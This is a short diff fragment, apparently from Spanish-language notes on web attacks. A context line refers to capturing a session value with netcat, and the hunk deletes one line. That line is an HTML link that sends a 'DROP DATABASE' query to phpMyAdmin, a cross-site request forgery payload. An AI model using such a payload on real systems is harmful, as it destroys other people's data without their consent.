@@ -109,4 +109,3 @@ y reemplazar el valor de la sesion por la variable capturada en netcat
 
 
 
-<a href="http://[HOST]/phpmyadmin/sql.php?sql_query=bbbDROP+DATABASE+[DBNAME]">
